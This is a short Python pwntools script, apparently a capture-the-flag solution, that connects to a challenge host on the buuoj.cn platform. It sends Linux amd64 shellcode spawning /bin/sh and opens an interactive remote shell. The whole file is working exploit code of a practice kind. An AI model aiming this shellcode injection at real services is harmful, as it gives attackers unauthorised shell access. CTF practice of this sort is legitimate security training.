from pwn import *

context(arch="amd64",os="linux",log_level="debug")
#sh=process("./timu")
sh=remote("node5.buuoj.cn",27284)

shellcode=asm(shellcraft.sh())
sh.sendline(shellcode)

sh.interactive()
